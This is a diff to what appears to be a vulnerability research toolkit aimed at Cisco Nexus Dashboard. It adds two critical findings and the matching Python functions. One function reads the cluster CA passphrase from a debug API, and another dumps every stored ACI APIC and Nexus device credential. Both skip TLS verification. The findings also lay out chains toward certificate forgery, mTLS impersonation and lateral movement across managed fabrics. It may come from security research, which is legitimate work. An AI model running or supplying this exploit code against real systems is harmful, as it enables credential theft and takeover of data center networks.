@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F16 (HIGH)
+Findings: ND-F01 (CRITICAL) through ND-F18 (CRITICAL)
 """
 
 import socket
@@ -424,6 +424,85 @@ FINDINGS = {
         "access_control": "world-readable cookie only (ND-F01)",
         "chain": "ND-F01 cookie -> clean-wipe all services -> full operational data destruction",
     },
+    "ND-F17": {
+        "title": "securitymgr CA Passphrase Debug Endpoint — Cluster CA Key Decryption via GET",
+        "severity": "CRITICAL",
+        "component": "securitymgr binary (port 8989) + confd debug API (port 19999)",
+        "description": (
+            "securitymgr exposes the current CA certificate request passphrase via the "
+            "confd debug API at GET /api/debug/passphraseresp. "
+            "Response: SecmgrCAPassphraseResp { currCertReqPassphrase: '<passphrase>', "
+            "currCertReqPassphraseExpiry: '<datetime>' }. "
+            "This passphrase is used to decrypt/operate the ND cluster CA private key. "
+            "With the CA passphrase, an attacker can: decrypt the CA private key from "
+            "the KMS etcd store (ND-F03), issue arbitrary TLS certificates for any ND "
+            "service, forge mTLS client certs for any cluster microservice, and MITM "
+            "all inter-service TLS traffic. "
+            "A second related endpoint: POST /api/debug/passphrase (SecmgrCAPassphraseReq) "
+            "requests a fresh CA passphrase (reqID only), suggesting passphrase rotation "
+            "is also debug-accessible. "
+            "Additionally: GET /api/debug/ securitymgr token endpoint returns "
+            "SecmgrTokenResp { caCert, currToken, oldToken, tokenExpiry } — "
+            "the current CA certificate and active signing token."
+        ),
+        "endpoints": {
+            "GET /api/debug/passphraseresp": "returns currCertReqPassphrase (CA key passphrase)",
+            "POST /api/debug/passphrase": "request CA passphrase rotation; reqID only",
+        },
+        "response_fields": {
+            "currCertReqPassphrase": "passphrase to decrypt CA private key",
+            "currCertReqPassphraseExpiry": "expiry timestamp",
+        },
+        "securitymgr_port": 8989,
+        "confd_debug_port": 19999,
+        "chain": (
+            "ND-F03 etcd bypass -> app-user mTLS cert -> confd debug API -> "
+            "GET /api/debug/passphraseresp -> CA passphrase -> "
+            "decrypt CA private key -> sign arbitrary certs for any cluster service -> "
+            "full mTLS impersonation"
+        ),
+    },
+    "ND-F18": {
+        "title": "securitymgr Credential Store Dump — ACI/Nexus Device Passwords via Debug API",
+        "severity": "CRITICAL",
+        "component": "securitymgr + confd debug API, CredmsCredStore schema",
+        "description": (
+            "The credential store managed by securitymgr contains device credentials "
+            "for all ACI APIC fabric controllers, Nexus switches, and managed sites "
+            "that ND supervises. Three retrieval paths: "
+            "(1) GET /api/debug/class/credentialstore — returns ALL credential stores; "
+            "(2) GET /api/debug/dn/credentialstore/{owner} — get by owner (ACI site name); "
+            "(3) POST /api/config/getcredentials — production path, retrieves by owner + reqID. "
+            "Credential store structure (CredmsCredStore): "
+            "{ owner: '<site-name>', components: { '<apic>': { credentials: "
+            "{ 'username': '...', 'password': '...' }, sharedWith: [...] } }, updated: '<ts>' }. "
+            "The components.credentials field is a Name/Value pair map — passwords are "
+            "stored as credentials values. The securitymgr backend is MongoDB "
+            "(mongodb.mongodb.svc:27017) — if MongoDB lacks auth (common in K8s-internal "
+            "services), direct DB access also yields all credentials. "
+            "ACI App User operations: POST /api/debug/acisiteappuser returns "
+            "SecmgrACIAppUserResp { cert: '<X509 PEM>', key: '<PRIVATE KEY PEM>' } — "
+            "securitymgr generates and RETURNS the private key for ACI app user certs."
+        ),
+        "endpoints": {
+            "GET /api/debug/class/credentialstore": "dump all credential stores",
+            "GET /api/debug/dn/credentialstore/{owner}": "get creds by ACI site owner",
+            "POST /api/config/getcredentials": "retrieve specific device credentials",
+            "POST /api/debug/acisiteappuser": "returns ACI app user cert + private key",
+        },
+        "credential_schema": {
+            "owner": "ACI site / managed device name",
+            "components.<device>.credentials": "Name/Value map with username/password",
+            "components.<device>.sharedWith": "services granted access to these creds",
+        },
+        "backend": "MongoDB mongodb.mongodb.svc:27017",
+        "chain": (
+            "ND-F03 mTLS cert OR ND-F16 confd debug access -> "
+            "GET /api/debug/class/credentialstore -> "
+            "all ACI APIC admin passwords + Nexus fabric credentials -> "
+            "lateral movement to ALL managed ACI fabrics and data center switches"
+        ),
+    },
     "ND-F15": {
         "title": "signdata: Snakeoil + Dev TPM/LUKS Signing Keys + Pre-Signed Production Hardware Policies",
         "severity": "CRITICAL",
@@ -794,6 +873,83 @@ def read_tyk_secret_from_log(log_path: str = "/logs/launcher.log") -> dict:
     except (PermissionError, FileNotFoundError) as e:
         result["error"] = str(e)
     return result
+
+
+def probe_confd_debug_api(host: str, port: int = 19999, path: str = "/api/debug/class/ndtrustedcas") -> dict:
+    """
+    Probe confd debug API for unauthenticated access.
+    ND-F16: All management endpoints under /api/debug/ prefix.
+    Key paths: /api/debug/class/credentialstore, /api/debug/class/ndtrustedcas,
+               /api/debug/passphraseresp (CA passphrase).
+    """
+    url = f"https://{host}:{port}{path}"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            body = resp.read().decode()
+            return {
+                "status": resp.status,
+                "body_preview": body[:500],
+                "credential_count": body.count('"owner"') if "credentialstore" in path else "N/A",
+                "finding": "ND-F16/ND-F18",
+            }
+    except urllib.error.HTTPError as e:
+        return {"http_error": e.code, "path": path, "finding": "ND-F16"}
+    except Exception as e:
+        return {"error": str(e), "path": path}
+
+
+def probe_securitymgr_ca_passphrase(host: str, port: int = 19999) -> dict:
+    """
+    GET confd debug passphrase response — returns live CA certificate request passphrase.
+    ND-F17: GET /api/debug/passphraseresp -> currCertReqPassphrase.
+    """
+    url = f"https://{host}:{port}/api/debug/passphraseresp"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            body = json.loads(resp.read().decode())
+            return {
+                "status": resp.status,
+                "passphrase_present": "currCertReqPassphrase" in body,
+                "passphrase": body.get("currCertReqPassphrase", "NOT_FOUND"),
+                "expiry": body.get("currCertReqPassphraseExpiry", ""),
+                "finding": "ND-F17",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F17"}
+
+
+def dump_credential_store(host: str, port: int = 19999) -> dict:
+    """
+    GET /api/debug/class/credentialstore — dump all stored device credentials.
+    ND-F18: Returns { owner, components: { <device>: { credentials: {user/pass}, sharedWith } } }
+    for all ACI APIC and Nexus fabric sites managed by this ND cluster.
+    """
+    url = f"https://{host}:{port}/api/debug/class/credentialstore"
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
+            body = resp.read().decode()
+            stores = json.loads(body) if body.startswith("[") else [json.loads(body)]
+            return {
+                "status": resp.status,
+                "credential_store_count": len(stores),
+                "owners": [s.get("owner", "?") for s in stores],
+                "raw": stores,
+                "finding": "ND-F18",
+            }
+    except Exception as e:
+        return {"error": str(e), "finding": "ND-F18"}
 
 
 def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
